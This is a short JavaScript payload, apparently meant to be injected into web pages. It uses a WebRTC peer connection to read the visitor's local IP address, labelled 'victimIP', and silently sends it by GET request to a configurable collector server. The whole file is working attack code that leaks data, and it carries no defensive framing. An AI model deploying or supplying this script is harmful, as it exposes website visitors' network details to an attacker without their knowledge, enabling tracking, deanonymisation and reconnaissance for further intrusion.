/**
 * update this as needed
 */
const ipAddress = '127.0.0.1';

// construct the target url
var url = `http://${ipAddress}/ip=`;

// globally scoped variables
let victimIP;

// get the WebRTC connection, if supported by the browser
window.RTCPeerConnection =
    window.RTCPeerConnection ||
    window.mozRTCPeerConnection ||
    window.webkitRTCPeerConnection ||
    false;

if (window.RTCPeerConnection) {
    // create a connection
    var pc = new RTCPeerConnection({ iceServers: [] }),
        noop = function() {};
    pc.createDataChannel('');
    pc.createOffer(pc.setLocalDescription.bind(pc), noop);

    pc.onicecandidate = function(event) {
        if (event && event.candidate && event.candidate.candidate) {
            // get the IP address
            var s = event.candidate.candidate.split('\n');
            victimIP = s[0].split(' ')[4];

            // gonstruct and send the request
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open('GET', url + victimIP, true);
            xmlHttp.send();
        }
    };
}
